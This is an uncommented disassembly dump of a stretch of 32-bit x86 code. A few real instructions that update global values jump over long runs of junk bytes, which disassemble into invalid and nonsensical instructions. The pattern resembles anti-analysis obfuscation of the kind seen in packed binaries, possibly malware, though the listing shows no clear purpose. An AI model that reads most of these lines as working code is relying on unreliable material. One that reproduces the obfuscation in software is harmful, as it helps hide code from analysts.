  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xbb25685f
  406b85:	xor    DWORD PTR [edx],eax
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0x437e7e7f
  406b8f:	hlt    
  406b90:	gs xchg esi,esi
  406b93:	push   ebx
  406b94:	ret    
  406b95:	mov    eax,DWORD PTR [edx-0x6c]
  406b98:	pop    eax
  406b99:	and    eax,eax
  406b9b:	nop
  406b9c:	inc    ebp
  406b9d:	iret   
  406b9e:	mov    bh,0xf7
  406ba0:	sbb    eax,ecx
  406ba2:	xor    eax,ebx
  406ba4:	ret    
  406ba5:	fst    QWORD PTR [eax+0x6e35e3f4]
  406bab:	sub    eax,0x2491175f
  406bb0:	mov    cl,0x84
  406bb2:	or     edx,0xffffff96
  406bb5:	je     0x406bf4
  406bb7:	daa    
  406bb8:	nop
  406bb9:	enter  0x1686,0x73
  406bbd:	sbb    DWORD PTR [edi-0x4e],ecx
  406bc0:	xchg   ebp,edi
  406bc2:	test   eax,esi
  406bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bc5:	or     cl,BYTE PTR [edx+0x4bbe9508]
  406bcb:	test   DWORD PTR [edi],ecx
  406bcd:	mov    al,0xa
  406bcf:	sbb    ch,dl
  406bd1:	sub    al,0xaa
  406bd3:	les    edx,FWORD PTR [edi+0x4ec84444]
  406bd9:	xor    eax,0x6b7af8d7
  406bde:	sub    eax,0x64e01419
  406be3:	(bad)  
  406be4:	pushf  
  406be5:	rcl    DWORD PTR [edx],cl
  406be7:	jo     0x406bdd
  406be9:	xor    BYTE PTR [ebp+0x73],cl
  406bec:	arpl   WORD PTR [edi+0x7c],cx
  406bef:	jno    0x406c4d
  406bf1:	sbb    al,0x26
  406bf3:	xchg   esi,eax
  406bf4:	jae    0x406c32
  406bf6:	or     DWORD PTR [ebp+0x75],eax
  406bf9:	aam    0x43
  406bfb:	std    
  406bfc:	mov    edi,0xd563634a
  406c01:	mov    ds:0xe1a5373d,eax
  406c06:	jns    0x406bf6
  406c08:	push   edi
  406c09:	fist   DWORD PTR [eax+0x20]
  406c0c:	call   DWORD PTR [ebx-0x34]
  406c0f:	cmp    al,0x59
  406c11:	cmc    
  406c12:	inc    ebx
  406c13:	lods   al,BYTE PTR ds:[esi]
  406c14:	sbb    al,BYTE PTR [ecx+0x4a331645]
  406c1a:	(bad)  
  406c1b:	idiv   DWORD PTR ds:0x9694566f
  406c21:	adc    al,0x61
  406c23:	xchg   esi,eax
  406c24:	out    0x2f,al
  406c26:	lods   al,BYTE PTR ds:[esi]
  406c27:	jge    0x406bdb
  406c29:	pusha  
  406c2a:	add    eax,0xba08b39b
  406c2f:	lods   al,BYTE PTR ds:[esi]
  406c30:	fdiv   DWORD PTR [edx-0x66e6082e]
  406c36:	jns    0x406be5
  406c38:	pusha  
  406c39:	dec    esp
  406c3a:	arpl   WORD PTR [esi-0x6],bx
  406c3d:	bound  ebp,QWORD PTR [ebx]
  406c3f:	push   ebx
  406c40:	mov    esi,0x41d7a356
  406c45:	enter  0x1288,0x2b
  406c49:	std    
  406c4a:	js     0x406c93
  406c4c:	bound  esp,QWORD PTR [esi+0x2902e2b2]
  406c52:	push   edi
  406c53:	or     dh,BYTE PTR [edi+0x7eb71a92]
  406c59:	xchg   edi,eax
  406c5a:	shld   DWORD PTR [edx-0x6ec72e69],ecx,0xc8
  406c62:	or     BYTE PTR [edx+0x6aa567f3],al
  406c68:	(bad)  
  406c69:	jnp    0x406c87
  406c6b:	dec    esp
  406c6c:	or     eax,0x2dc2a855
  406c71:	aad    0x4b
  406c73:	(bad)  
  406c74:	cli    
  406c75:	ss pop es
  406c77:	fcom   QWORD PTR [eax]
  406c79:	(bad)  
  406c7a:	sahf   
  406c7b:	mov    ebx,0x103f0caa
  406c80:	pop    esi
  406c81:	mov    bh,0xb9
  406c83:	pop    es
  406c84:	fidivr WORD PTR [edi+0x57]
  406c87:	lds    ebx,FWORD PTR [edx+0x53]
  406c8a:	das    
  406c8b:	fs out 0x6,eax
  406c8e:	add    ah,al
  406c90:	dec    ecx
  406c91:	fidiv  DWORD PTR [edi]
  406c93:	jmp    0xf8f5:0xa8f95e2a
  406c9a:	popf   
  406c9b:	addr16 mov al,0x29
  406c9e:	ss jb  0x406ce3
  406ca1:	mov    edx,0xc4a470bc
  406ca6:	and    BYTE PTR [edx],bl
  406ca8:	fcmovnu st,st(3)
  406caa:	pop    es
  406cab:	xchg   ebx,eax
  406cac:	jp     0x406ccc
  406cae:	dec    edi
  406caf:	test   al,0x9
  406cb1:	push   edx
  406cb2:	cmp    al,0x54
  406cb4:	daa    
  406cb5:	pop    ebp
  406cb6:	loopne 0x406d2f
  406cb8:	int3   
  406cb9:	mov    edi,0xdd7a9bbc
  406cbe:	xlat   BYTE PTR ds:[ebx]
  406cbf:	fsub   st(5),st
  406cc1:	or     ecx,esi
  406cc3:	cmp    al,0x7a
  406cc5:	mov    esp,0xdda0231e
  406cca:	call   0x7af34ad2
  406ccf:	lahf   
  406cd0:	xor    ah,BYTE PTR [esp+edx*8]
  406cd3:	mov    dl,0x66
  406cd5:	mov    dl,0x82
  406cd7:	in     al,dx
  406cd8:	dec    ecx
  406cd9:	addr16 adc al,0x5e
  406cdc:	stc    
  406cdd:	mov    ebp,0x2d23a39c
  406ce2:	mov    bl,bl
  406ce4:	and    eax,0xb0ec7c35
  406ce9:	jecxz  0x406cdc
  406ceb:	jae    0x406ca0
  406ced:	cdq    
  406cee:	adc    eax,0x2ad99825
  406cf3:	shl    ebp,1
  406cf5:	(bad)  
  406cf6:	fdiv   DWORD PTR [esi-0x41]
  406cf9:	pop    ds
  406cfa:	popf   
  406cfb:	sbb    al,0xa8
  406cfd:	dec    edi
  406cfe:	scas   al,BYTE PTR es:[edi]
  406cff:	pop    ebx
  406d00:	or     cl,BYTE PTR [ebx+0x646d38ca]
  406d06:	inc    eax
  406d07:	outs   dx,DWORD PTR ds:[esi]
  406d08:	lds    edx,FWORD PTR [ebp+0x72]
  406d0b:	push   esp
  406d0c:	mov    ch,0xb9
  406d0e:	js     0x406d8b
  406d10:	les    eax,FWORD PTR [eax-0x16389aef]
  406d16:	(bad)  ds:0xad448f02
  406d1c:	sti    
  406d1d:	rcl    BYTE PTR [eax],0x1
  406d20:	dec    ecx
  406d21:	mov    ecx,0xd2ee1951
  406d26:	adc    BYTE PTR [esi-0x77],bh
  406d29:	mov    ebx,0xb5f645f1
  406d2e:	nop
  406d2f:	and    al,ah
  406d31:	scas   eax,DWORD PTR es:[edi]
  406d32:	jne    0x406dac
  406d34:	psubusw mm5,QWORD PTR [edx+0x270f80]
  406d3b:	pop    eax
  406d3c:	lds    ebp,FWORD PTR [eax+0x4bc4c8e6]
  406d42:	out    dx,eax
  406d43:	mov    eax,DWORD PTR ds:0xb78ba7e4
  406d49:	in     eax,0x6f
  406d4b:	jmp    0x406da7
  406d4d:	xchg   DWORD PTR [esi],ebp
  406d4f:	aas    
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x94
  406d91:	retf   
  406d92:	(bad)  
  406d93:	mov    ah,0x40
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0x797e7e7f
  406d9d:	into   
  406d9e:	pusha  
  406d9f:	rcr    ah,0x3f
  406da2:	jne    0x406df9
  406da4:	ins    BYTE PTR es:[edi],dx
  406da5:	or     eax,0xa1ec55c8
  406daa:	das    
  406dab:	dec    ecx
  406dac:	mov    bh,BYTE PTR [ebp-0x571aba2f]
  406db2:	mov    cl,0x41
  406db4:	push   ebx
  406db5:	mov    BYTE PTR [ebx],0x47
  406db8:	int    0x80
  406dba:	mov    ah,0xd1
  406dbc:	jbe    0x406d8a
  406dbe:	jl     0x406db1
  406dc0:	jbe    0x406e0b
  406dc2:	jnp    0x406df0
  406dc4:	gs push ebx
  406dc6:	lods   al,BYTE PTR ds:[esi]
  406dc7:	imul   edi,DWORD PTR [edi-0x6e],0x444638a9
  406dce:	jecxz  0x406e34
  406dd0:	cmp    DWORD PTR fs:[ecx-0x2e],ebx
  406dd4:	pusha  
  406dd5:	stos   DWORD PTR es:[edi],eax
  406dd6:	pop    esp
  406dd7:	add    DWORD PTR [ecx],ebp
  406dd9:	sti    
  406dda:	lahf   
  406ddb:	scas   eax,DWORD PTR es:[edi]
  406ddc:	mov    ebp,0x9b7f42f4
  406de1:	mov    ds:0xab4d04d4,al
  406de6:	xor    eax,0xebc04f01
  406deb:	push   ss
  406dec:	repz mov edi,0x8b818ed6
  406df2:	push   ebp
  406df3:	fnstcw WORD PTR [eax]
  406df5:	inc    ecx
  406df6:	jno    0x406dbf
  406df8:	mov    BYTE PTR [ebp-0x32],bl
  406dfb:	xor    eax,0xf70ce07d
  406e00:	mov    eax,ds:0x11dac75a
  406e05:	push   esp
  406e06:	sub    esi,DWORD PTR [edi-0x12defe9f]
  406e0c:	jecxz  0x406dcd
  406e0e:	imul   esp,DWORD PTR [edx-0x67b86abc],0x9fc1989
  406e18:	in     al,0xd3
  406e1a:	mov    eax,0xf1fa6a6d
  406e1f:	dec    ecx
  406e20:	cmp    dl,BYTE PTR [edx]
  406e22:	test   al,0xf9
  406e24:	loope  0x406e50
  406e26:	rcr    DWORD PTR [ecx],1
  406e28:	push   eax
  406e29:	push   esi
  406e2a:	push   es
  406e2b:	xchg   ecx,eax
  406e2c:	sti    
  406e2d:	aas    
  406e2e:	int3   
  406e2f:	int    0xdf
  406e31:	push   cs
  406e32:	popa   
  406e33:	popf   
  406e34:	and    al,0x48
  406e36:	push   ecx
  406e37:	pop    ecx
  406e38:	xor    BYTE PTR [esi],0x4f
  406e3b:	(bad)  
  406e3c:	ss push es
  406e3e:	scas   eax,DWORD PTR es:[edi]
  406e3f:	mov    bh,0xc8
  406e41:	jl     0x406dea
  406e43:	jecxz  0x406e77
  406e45:	daa    
  406e46:	enter  0xbc9,0x50
  406e4a:	adc    al,0x82
  406e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e4d:	loope  0x406e8a
  406e4f:	icebp  
  406e50:	pop    esp
  406e51:	inc    eax
  406e52:	inc    esp
  406e53:	inc    eax
  406e54:	mov    ebp,0xd7c40329
  406e59:	jo     0x406e65
  406e5b:	mov    ecx,0x23fa7bf2
  406e60:	and    DWORD PTR [edi-0x53],edi
  406e63:	daa    
  406e64:	jg     0x406e54
  406e66:	and    al,0x41
  406e68:	xchg   DWORD PTR ds:[edi],edi
  406e6b:	mov    al,ds:0x975e038
  406e70:	fild   WORD PTR [ebx-0x3d3cca85]
  406e76:	jle    0x406df9
  406e78:	in     eax,dx
  406e79:	jbe    0x406dfc
  406e7b:	call   0xfc8c:0xd178adc5
  406e82:	jns    0x406e68
  406e84:	jns    0x406e38
  406e86:	fisttp DWORD PTR [ebp+0x5]
  406e89:	add    al,0x8f
  406e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e8c:	push   ds
  406e8d:	dec    ebx
  406e8e:	xlat   BYTE PTR ds:[ebx]
  406e8f:	cmp    bh,bl
  406e91:	and    cl,BYTE PTR [esi]
  406e93:	push   ebp
  406e94:	push   cs
  406e95:	lds    esp,FWORD PTR [esp+eiz*2]
  406e98:	out    dx,al
  406e99:	and    bl,BYTE PTR [bp+di-0x2b]
  406e9d:	xor    ah,dh
  406e9f:	xchg   edi,eax
  406ea0:	int3   
  406ea1:	(bad)  
  406ea2:	in     eax,dx
  406ea3:	jbe    0x406e71
  406ea5:	(bad)  
  406ea7:	xor    DWORD PTR [ebx],ebp
  406ea9:	push   0x46be7fe5
  406eae:	jb     0x406edf
  406eb0:	loopne 0x406ef0
  406eb2:	jae    0x406ed7
  406eb4:	mov    eax,ds:0x50b5f213
  406eb9:	sar    ecx,0x51
  406ebc:	xor    eax,0xe0250573
  406ec1:	int    0xd
  406ec3:	sar    DWORD PTR [ecx],cl
  406ec5:	je     0x406f11
  406ec7:	jg     0x406f23
  406ec9:	push   es
  406eca:	test   BYTE PTR [ecx-0x1f277cdc],dh
  406ed0:	jmp    0x5ed0:0x569e1920
  406ed7:	adc    eax,0x762a9878
  406edc:	mov    ah,0x56
  406ede:	jg     0x406ea5
  406ee0:	push   0xffffff9a
  406ee2:	sbb    BYTE PTR [esi+0x215b0dd2],bl
  406ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ee9:	push   ebp
  406eea:	arpl   WORD PTR [edx-0x73eb48ca],bp
  406ef0:	add    bl,dh
  406ef2:	test   BYTE PTR [ebp+eiz*8-0x1cc76ef],dh
  406ef9:	fistp  WORD PTR [edi+0x2a]
  406efc:	mov    dl,0x3a
  406efe:	cmp    BYTE PTR [eax],ah
  406f00:	mov    eax,ds:0x7aaf96c
  406f05:	(bad)  
  406f06:	pushf  
  406f07:	lahf   
  406f08:	xchg   DWORD PTR [edx-0x42],esp
  406f0b:	mov    BYTE PTR [ecx-0x35],ch
  406f0e:	xor    ebx,DWORD PTR [esi+0x47]
  406f11:	ins    BYTE PTR es:[edi],dx
  406f12:	repnz push eax
  406f14:	in     eax,0x7c
  406f16:	cmp    DWORD PTR [edi],edi
  406f18:	add    DWORD PTR [ecx-0x732ffa36],ebp
  406f1e:	addr16 push cx
  406f21:	ret    0x9ff9
  406f24:	jg     0x406ef1
  406f26:	sub    DWORD PTR [eax+0x2c],0xb4ea7858
  406f2d:	aam    0x47
  406f2f:	popf   
  406f30:	sbb    eax,0x8e3c7277
  406f35:	mov    ah,0xc6
  406f37:	mov    ds:0xe054cbae,eax
  406f3c:	repnz pusha 
  406f3e:	xchg   edx,eax
  406f3f:	cmp    eax,0x6a598ba
  406f44:	mov    bh,0xb6
  406f46:	gs cmp ch,cl
  406f49:	std    
  406f4a:	dec    esp
  406f4b:	mov    ecx,0x4d422c7a
  406f50:	mov    al,ds:0xe60ab25c
  406f55:	lds    eax,FWORD PTR [edi]
  406f57:	add    DWORD PTR [eax-0x32],edx
  406f5a:	test   al,0xf7
  406f5c:	popf   
  406f5d:	ja     0x406f56
  406f5f:	rol    BYTE PTR [ecx+0x43360f25],1
  406f65:	add    BYTE PTR [ebx+0x36],dl
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x462e4fe
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xdb7e7e7f
  406f9f:	addr16 sbb al,0xd4
  406fa2:	inc    eax
  406fa3:	retf   0xd79c
  406fa6:	dec    ebp
  406fa7:	xor    al,0xfb
  406fa9:	xchg   ebx,eax
  406faa:	(bad)  
  406fab:	cmc    
  406fac:	lock or al,0x4
  406faf:	jb     0x406f98
  406fb1:	mov    al,0xb
  406fb3:	sbb    DWORD PTR [edx],edx
  406fb5:	int    0x9b
  406fb7:	mov    ds:0xb5117c60,al
  406fbc:	ret    0x45b9
  406fbf:	repz neg BYTE PTR [eax+edx*8]
  406fc3:	xrelease mov DWORD PTR [ecx+0x41c7fd3d],esi
  406fca:	inc    ebp
  406fcb:	sub    ch,dl
  406fcd:	mov    DWORD PTR [ecx],ebx
  406fcf:	sub    al,0x9f
  406fd1:	fisub  DWORD PTR [edi+0x3e]
  406fd4:	sar    BYTE PTR ds:0x9ba6186f,cl
  406fda:	push   esi
  406fdb:	push   ds
  406fdc:	or     BYTE PTR [ecx+0x3f],0x80
  406fe0:	add    edi,edi
  406fe2:	in     al,dx
  406fe3:	test   BYTE PTR [ebx-0x4e],cl
  406fe6:	dec    esp
  406fe7:	dec    ecx
  406fe8:	dec    ebp
  406fe9:	mov    ah,ch
  406feb:	mov    bh,0x79
  406fed:	aas    
  406fee:	call   0x1958000f
  406ff3:	dec    edx
  406ff4:	int3   
  406ff5:	ss es retf 0xbb47
  406ffa:	movhps xmm2,QWORD PTR [edx-0x7f27790c]
  407001:	push   esi
  407002:	mov    DWORD PTR [eax+0x4d7770ca],0x2aebc5a9
  40700c:	cmp    eax,0xa7c8ace1
  407011:	leave  
  407012:	aad    0x49
  407014:	test   al,0xd8
  407016:	test   bl,0xff
  407019:	pusha  
  40701a:	sub    ebp,ebp
  40701c:	adc    BYTE PTR ds:0xb986621,dh
  407022:	dec    edi
  407023:	xor    eax,0xbe46249c
  407028:	push   0xfffffffd
  40702a:	shl    BYTE PTR ds:0x44e582e2,cl
  407030:	mov    ch,ch
  407032:	ss cmp eax,0x575c27d
  407038:	push   ebp
  407039:	pop    ebx
  40703a:	loope  0x4070a0
  40703c:	cld    
  40703d:	xchg   DWORD PTR [eax],esp
  40703f:	fs pop es
  407041:	int    0xd
  407043:	outs   dx,BYTE PTR ds:[esi]
  407044:	pop    ebx
  407045:	in     al,0x32
  407047:	sbb    DWORD PTR [ebp+0x221816d0],0x6c1b27ff
  407051:	xor    BYTE PTR [eax],0x3f
  407054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407055:	mov    ?,ebp
  407057:	sub    DWORD PTR [eax+0x28],ebx
  40705a:	retf   0x9fca
  40705d:	add    BYTE PTR [edi+0x7886ead5],ah
  407063:	popa   
  407064:	mov    ch,cl
  407066:	(bad)  
  407068:	rol    BYTE PTR [ecx-0x1a],0xb7
  40706c:	cld    
  40706d:	cli    
  40706e:	push   ecx
  40706f:	xor    ebx,ebp
  407071:	in     al,0x2
  407073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407074:	xchg   edi,eax
  407075:	pop    ebx
  407076:	sbb    DWORD PTR [edx],edi
  407078:	jp     0x407002
  40707a:	iret   
  40707b:	cmc    
  40707c:	and    esi,DWORD PTR [esi+0x78]
  40707f:	imul   eax,DWORD PTR [ecx],0xffffff8a
  407082:	repnz lock mov DWORD PTR fs:[ebp+edi*1+0x49],0x44548b8e
  40708d:	ds and eax,0x7cbcf87c
  407093:	xor    eax,DWORD PTR ds:0x2667a806
  407099:	aas    
  40709a:	into   
  40709b:	repz mov bl,BYTE PTR [edi]
  40709e:	imul   ecx,DWORD PTR [eax-0x65c5f4c2],0xc5bfeda1
  4070a8:	clc    
  4070a9:	loop   0x4070df
  4070ab:	psadbw mm3,mm3
  4070ae:	mov    eax,0xc549fd34
  4070b3:	push   edi
  4070b4:	cdq    
  4070b5:	xchg   esp,esi
  4070b7:	sbb    DWORD PTR [ebp-0x26],0x50
  4070bb:	mov    ebp,0xe6880e47
  4070c0:	popa   
  4070c1:	gs mov edi,0xc15f139d
  4070c7:	imul   edi,DWORD PTR [ebx-0x1e31c66a],0xffffffef
  4070ce:	jecxz  0x4070ce
  4070d0:	repz into 
  4070d2:	and    eax,0x45ad2e33
  4070d7:	out    dx,eax
  4070d8:	iret   
  4070d9:	push   eax
  4070da:	mov    cl,0xe9
  4070dc:	and    DWORD PTR [ecx-0x32],esi
  4070df:	pop    esp
  4070e0:	loope  0x40714f
  4070e2:	or     ebx,esi
  4070e4:	or     DWORD PTR [eax-0x19ac96b5],ecx
  4070ea:	iret   
  4070eb:	inc    eax
  4070ec:	sbb    al,0x30
  4070ee:	mov    eax,ds:0xc6c55581
  4070f3:	js     0x40710c
  4070f5:	mov    ax,ds:0xaae3643b
  4070fb:	sub    BYTE PTR [esi-0x3f01b434],cl
  407101:	dec    ebx
  407102:	xchg   esp,eax
  407103:	scas   eax,DWORD PTR es:[edi]
  407104:	inc    edx
  407105:	push   0xe4874a85
  40710a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40710b:	jmp    0x7c8c:0xe005bc07
  407112:	add    ebx,DWORD PTR [ebx+0x33]
  407115:	(bad)  
  407116:	div    ebp
  407118:	push   ebx
  407119:	out    dx,eax
  40711a:	pop    ecx
  40711b:	into   
  40711c:	jno    0x4070eb
  40711e:	std    
  40711f:	and    DWORD PTR [esi],edx
  407121:	aam    0xbb
  407123:	imul   ebp,DWORD PTR [edx+ebp*2+0x62ba68d6],0xffffffa4
  40712b:	adc    edx,DWORD PTR [esi+0x770560c2]
  407131:	sti    
  407132:	pop    ebx
  407133:	mov    dl,0x6b
  407135:	dec    esi
  407136:	mov    BYTE PTR [eax],0xdf
  407139:	fst    st(1)
  40713c:	inc    eax
  40713d:	neg    DWORD PTR [ebp+esi*4-0x34f28063]
  407144:	sub    eax,0x15756862
  407149:	sti    
  40714a:	ins    BYTE PTR es:[edi],dx
  40714b:	jmp    0x5016:0x99fe0d67
  407152:	xor    ah,BYTE PTR [ecx-0x1032f67e]
  407158:	mov    al,ds:0x3f35d560
  40715d:	jbe    0x4071de
  40715f:	add    eax,0xe80875ff
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	loopne 0x407161
  40717d:	jmp    0x7f053ddb
  407182:	jle    0x407140
  407184:	jg     0x407204
  407186:	jle    0x407126
  407188:	mov    esp,0x815f466d
  40718d:	or     DWORD PTR [ebx+0x4a13506a],esi
  407193:	rcl    DWORD PTR [edx-0x2b],cl
  407196:	int3   
  407197:	test   al,0x59
  407199:	std    
  40719a:	jmp    0xbcc8d8ab
  40719f:	in     al,dx
  4071a0:	adc    ebp,edx
  4071a2:	jbe    0x407174
  4071a4:	adc    eax,0x25285df0
  4071a9:	or     bl,BYTE PTR ds:0xf09762ef
  4071af:	mov    BYTE PTR [eax-0x24],bh
  4071b2:	mov    ah,0x51
  4071b4:	push   eax
  4071b5:	sbb    al,0xbc
  4071b7:	popf   
  4071b8:	ins    DWORD PTR es:[edi],dx
  4071b9:	imul   ecx,DWORD PTR [esi],0xffffffd3
  4071bc:	mov    ?,WORD PTR ds:0xee59f1e6
  4071c2:	(bad)  
  4071c3:	aad    0x76
  4071c5:	popf   
  4071c6:	sub    edx,DWORD PTR [esi+eax*1-0x727526fd]
  4071cd:	fld    TBYTE PTR [esi-0x3d]
  4071d0:	pop    esi
  4071d1:	outs   dx,BYTE PTR ds:[esi]
  4071d2:	retf   
  4071d3:	jb     0x407168
  4071d5:	push   edx
  4071d6:	sub    al,BYTE PTR [eax-0x20]
  4071d9:	push   ds
  4071da:	jbe    0x407255
  4071dc:	stos   BYTE PTR es:[edi],al
  4071dd:	inc    ecx
  4071de:	pop    ds
  4071df:	sbb    al,0xcd
  4071e1:	addr16 jle 0x4071e0
  4071e4:	enter  0xa664,0x62
  4071e8:	add    cl,al
  4071ea:	mov    ds:0x4f71b751,al
  4071ef:	dec    ebx
  4071f0:	test   al,0x69
  4071f2:	popf   
  4071f3:	and    al,0xbf
  4071f5:	popa   
  4071f6:	in     eax,0x32
  4071f8:	(bad)  
  4071f9:	fistp  DWORD PTR [edx]
  4071fb:	push   0x74b06f60
  407200:	lods   al,BYTE PTR ds:[esi]
  407201:	mov    BYTE PTR [ecx+ebp*2+0x44],cl
  407205:	and    BYTE PTR [edi+0x4d],ch
  407208:	jl     0x407238
  40720a:	xlat   BYTE PTR ds:[ebx]
  40720b:	pop    edx
  40720c:	stos   BYTE PTR es:[edi],al
  40720d:	mov    cl,0x63
  40720f:	out    dx,al
  407210:	scas   al,BYTE PTR es:[edi]
  407211:	xchg   ecx,eax
  407212:	cmc    
  407213:	mov    bh,0xcb
  407215:	cdq    
  407216:	inc    esi
  407217:	int3   
  407218:	call   FWORD PTR [eax]
  40721a:	lock ss xor al,0x94
  40721e:	cld    
  40721f:	cmp    al,0xc6
  407221:	ins    BYTE PTR es:[edi],dx
  407222:	inc    edx
  407223:	fwait
  407224:	nop
  407225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407226:	repnz push ebp
  407228:	je     0x407261
  40722a:	std    
  40722b:	data16 or al,0x87
  40722e:	clc    
  40722f:	mov    edi,0x48d0aae9
  407234:	mov    ebp,0xc511bd56
  407239:	mov    BYTE PTR [ecx+0x26d184c8],al
  40723f:	xor    edi,0xe16bea34
  407245:	into   
  407246:	push   cs
  407247:	icebp  
  407248:	in     al,0xcd
  40724a:	adc    BYTE PTR [eax+0x490f1b0c],bl
  407250:	inc    edi
  407251:	out    dx,eax
  407252:	dec    ecx
  407253:	icebp  
  407254:	pusha  
  407255:	sbb    eax,0xa9ea61b2
  40725a:	out    dx,al
  40725b:	jae    0x4072ac
  40725d:	sub    BYTE PTR [ebp+0x7c],ah
  407260:	add    ah,BYTE PTR [ecx]
  407262:	mov    esi,0x13308356
  407267:	or     DWORD PTR [edx+0x5d605822],esi
  40726d:	retf   0x1ca7
  407270:	lahf   
  407271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407272:	sub    al,0x93
  407274:	jge    0x4072c1
  407276:	inc    ebx
  407277:	into   
  407278:	mov    ds:0xa1f4c6dc,eax
  40727d:	stos   BYTE PTR es:[edi],al
  40727e:	sbb    ebx,0xffffffcb
  407281:	les    edx,FWORD PTR [eax-0x56]
  407284:	call   0xc43321ec
  407289:	cmp    al,0x32
  40728b:	out    0x64,eax
  40728d:	and    BYTE PTR [ebp-0x4e7240b0],dl
  407293:	add    ebx,DWORD PTR [ecx]
  407295:	ds and al,0x11
  407298:	sbb    bl,dl
  40729a:	mov    dh,0x58
  40729c:	ret    
  40729d:	fstp   DWORD PTR [edx-0x158c200a]
  4072a3:	test   DWORD PTR [esi],esi
  4072a5:	mov    edi,0x2914e40d
  4072aa:	sbb    edx,DWORD PTR [edi]
  4072ac:	sbb    BYTE PTR [ebp-0x35e69962],dl
  4072b2:	mov    DWORD PTR [edx-0x79e2dab9],0x80c46f9c
  4072bc:	mov    ebp,ebx
  4072be:	push   edx
  4072bf:	sbb    eax,0xc644f099
  4072c4:	hlt    
  4072c5:	mov    WORD PTR [eax+0x3f],?
  4072c8:	xlat   BYTE PTR ds:[ebx]
  4072c9:	mov    esp,0x4b017238
  4072ce:	scas   eax,DWORD PTR es:[edi]
  4072cf:	xor    ch,bh
  4072d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072d2:	scas   eax,DWORD PTR es:[edi]
  4072d3:	mov    al,ds:0xf47d061b
  4072d8:	pop    ebp
  4072d9:	add    edi,DWORD PTR [esi*1+0x2d739f62]
  4072e0:	cmp    al,0x65
  4072e2:	std    
  4072e3:	fist   DWORD PTR [ebx-0x3e290cd7]
  4072e9:	lss    ecx,FWORD PTR [ebp-0x10]
  4072ed:	out    0x2a,al
  4072ef:	jecxz  0x407357
  4072f1:	loope  0x40728a
  4072f3:	test   BYTE PTR [edi-0x19d942be],bh
  4072f9:	mov    ebp,0xfe922678
  4072fe:	fbld   TBYTE PTR cs:[ebx+0x35]
  407303:	call   DWORD PTR [edi-0x39521dbd]
  407309:	push   esp
  40730a:	or     ecx,esi
  40730c:	pop    ecx
  40730d:	xor    BYTE PTR [esp+ecx*2],ch
  407310:	xor    eax,0x66577a4e
  407315:	and    edi,DWORD PTR [ebx]
  407317:	mov    eax,ds:0xe1a50fb5
  40731c:	mov    edx,0x932df291
  407321:	push   edi
  407322:	add    ebp,DWORD PTR ds:0xd705d7fb
  407328:	aaa    
  407329:	and    DWORD PTR [edi+ebp*2+0x65b8cc00],eax
  407330:	mov    esp,0x4afdc9cb
  407335:	jno    0x4072f1
  407337:	inc    esi
  407338:	dec    edi
  407339:	mov    dl,0x78
  40733b:	repz push edx
  40733d:	push   es
  40733e:	leave  
  40733f:	lock cmp ah,0x6c
  407343:	jmp    0x922a37d0
  407348:	inc    edi
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407383
  407387:	(bad)  
  407388:	mov    bl,0x9f
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0xb87e7e7c
  407393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407394:	fsubr  DWORD PTR [edx-0x6ad71e28]
